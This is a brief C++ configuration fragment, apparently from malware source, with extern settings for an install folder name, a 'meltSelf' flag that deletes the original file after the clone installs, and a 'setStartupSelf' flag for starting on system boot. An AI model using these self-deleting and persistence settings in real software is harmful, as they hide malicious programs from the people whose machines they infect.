...
extern std::string folderName = "latestProjectTestDIR";	//folder name
...
extern bool meltSelf = true;				//specifies whether the installed clone should delete the initial file
extern bool setStartupSelf = true;			//specifies whether the program is to be started on system boot